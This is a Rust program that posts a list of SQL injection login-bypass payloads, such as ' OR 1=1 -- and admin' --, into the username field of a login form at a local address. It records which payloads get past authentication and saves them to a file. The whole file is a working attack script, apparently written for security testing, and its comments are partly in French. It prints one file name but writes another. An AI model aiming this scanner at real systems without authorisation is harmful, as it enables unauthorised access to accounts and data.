use reqwest::Client;
use std::error::Error;
use std::fs::File;
use std::io::Write;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = "http://127.0.0.1:8080/login";

    // List of SQL injection payloads to test
    let payloads = vec![
        "' OR 1=1 --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin' --",
        "admin' OR '1'='1",
    ];

    let mut successes = Vec::new();

    println!("[+] Starting SQL injection scan on /login...");

    for payload in &payloads {
        // On part du principe que la connexion demande username et password 
        // Insert payload into username; password  -- on rempli les 2 champs même si nos inections vont commenter la partie commentaire car erreur empty champs
        let params = [("username", *payload), ("password", "anyvalue")];

        let res = client.post(url)
            .form(&params)
            .send()
            .await?;

        let status = res.status();

        let body = res.text().await?;

        // Here we check for signs of a successful login,
        // like absence of "Invalid credentials" or presence of redirect.
        if status.is_success() && !body.contains("Invalid credentials") {
            println!("[+] Payload succeeded: {}", payload);
            successes.push(payload.to_string());
        } else {
            println!("[x] Failed with payload: {}", payload);
        }
    }

    if successes.is_empty() {
        println!("\n[-] No successful payloads found.");
    } else {
        println!("\n[+] Scan complete. Successful payloads saved to results.txt");
        let mut file = File::create("result.txt")?;
        for payload in &successes {
            writeln!(file, "{}", payload)?;
        }
    }

    Ok(())
}
